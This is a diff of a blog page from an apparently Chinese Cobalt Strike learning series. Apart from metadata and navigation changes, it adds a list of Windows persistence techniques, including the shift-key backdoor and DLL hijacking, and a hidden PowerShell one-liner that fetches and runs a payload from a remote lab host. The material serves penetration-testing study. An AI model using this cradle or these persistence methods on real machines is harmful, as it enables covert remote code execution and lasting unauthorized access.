@@ -38,7 +38,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg5.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg6.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/headImg7.png">
-<meta property="og:updated_time" content="2019-10-16T13:30:54.004Z">
+<meta property="og:updated_time" content="2019-10-24T01:41:27.579Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CobaltStrike学习五">
 <meta name="twitter:description" content="在渗透过程中拿到目标权限只是开始，如果管理员修复了漏洞权限就丢失了，这时候要想持续在内网进行渗透就需要权限维持。了解cs的权限维持的手段，熟悉win下注册表、开机启动项以及各种渗透中常见的命令。">
@@ -93,6 +93,8 @@
     <br/>
     <span id="actions">
       <ul>
+        
+        <li><a class="icon" href="/2019/10/18/CobaltStrike学习六/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" href="/2019/10/16/CobaltStrike学习四/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -171,6 +173,8 @@
 <a id="more"></a>
 
 <hr>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>注册表</span><br><span class="line"><span class="number">2.</span>启动项</span><br><span class="line"><span class="number">3.</span>计时任务</span><br><span class="line"><span class="number">4.</span>设置服务</span><br><span class="line"><span class="number">5.</span>shift后门</span><br><span class="line"><span class="number">6.</span>dll劫持(白加黑)</span><br><span class="line"><span class="number">7.</span>利用其他安装的软件</span><br></pre></td></tr></table></figure>
+
 <h2 id="设置powershell脚本开机自启动后门"><a href="#设置powershell脚本开机自启动后门" class="headerlink" title="设置powershell脚本开机自启动后门"></a>设置powershell脚本开机自启动后门</h2><p>点击Attacks-&gt;web driver-by -&gt;script web delivery<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/%7DI%40FX2R7%7DWHI.png" alt></p>
 <p>点击launch后出现如下<br>将其复制到靶机的cmd运行即可<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/NJHB%7B%607%7D4%60XM8L%5B%60NIE0V.png" alt></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.1.1.100:81/a'))"</span><br></pre></td></tr></table></figure>
